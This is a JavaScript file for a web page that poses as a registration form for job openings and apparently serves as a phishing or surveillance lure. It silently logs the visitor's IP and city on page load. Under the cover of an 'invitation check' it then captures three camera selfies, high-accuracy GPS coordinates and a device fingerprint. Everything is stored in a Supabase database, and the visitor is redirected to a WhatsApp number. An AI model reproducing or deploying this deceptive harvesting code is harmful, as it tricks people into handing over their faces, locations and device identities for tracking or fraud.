// =================================================================
// CONFIGURAÇÃO DE CONEXÃO (Usando o Supabase Global do HTML)
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// SISTEMA DE ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// INICIALIZAÇÃO DO SISTEMA E CÂMERA + PRÉ-CADASTRO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    // Pré-cadastro (IP)
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      await supabaseClient.from('checkins').insert([{
        tipo_captura: "previa",
        ip: data.ip || "indisponível",
        cidade: data.city || "",
        user_agent: navigator.userAgent
      }]);
      console.log("Pré-cadastro salvo");
    } catch(e) {
      console.log("Pré-cadastro falhou");
    }

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

    await new Promise((resolve) => {
      if(video.readyState >= 2){
        resolve();
      } else {
        video.onloadeddata = () => resolve();
      }
    });

    statusText.innerHTML = "✅ Sistema pronto";
  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}

window.onload = () => {
  iniciarSistema();
};

// =================================================================
// RASTREADOR E ANALISADOR DE DISPOSITIVO
// =================================================================
function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
 
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
 
  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

// =================================================================
// EVENTO DO BOTÃO: FLUXO DE CAPTURA E SALVAMENTO
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
   
    statusText.innerHTML = "📨 Verificando informações do convite..";
    falar("Verificando informações do convite..");

    const largura = video.videoWidth;
    const altura = video.videoHeight;
    if(!largura || !altura){
      throw new Error("Vídeo não carregou corretamente.");
    }

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      statusText.innerHTML = "📍 Localizando sua Vaga...";
      falar("Localizando sua Vaga.");
      const localizacao = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });
      latitude = localizacao.coords.latitude;
      longitude = localizacao.coords.longitude;
    } catch(err) {
      console.log("GPS não capturado:", err);
    }

    let ip = "indisponível";
    let cidade = "";
    let estado = "";
    let pais = "";
    try {
      statusText.innerHTML = "🌐 Obtendo Dados Regionais...";
      const req = await fetch("https://ipapi.co/json/");
      const json = await req.json();
      ip = json.ip || "indisponível";
      cidade = json.city || "";
      estado = json.region || "";
      pais = json.country_name || "";
    } catch(err) {
      console.log("Erro IPAPI:", err);
    }

    statusText.innerHTML = "💾 Salvando cadastro...";
    falar("Salvando cadastro.");
   
    const infoDispositivo = analisarDispositivo();

    const { error } = await supabaseClient
      .from('checkins')
      .insert([{
        tipo_captura: "completo",
        selfies: fotos,
        latitude: latitude.toString(),
        longitude: longitude.toString(),
        ip: ip,
        cidade: cidade,
        estado: estado,
        pais: pais,
        user_agent: navigator.userAgent,
        modelo_dispositivo: infoDispositivo.model,
        versao_android: infoDispositivo.androidVersion,
        navegador: infoDispositivo.browser,
        plataforma: navigator.platform,
        idioma: navigator.language,
        largura_tela: window.innerWidth,
        altura_tela: window.innerHeight
      }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
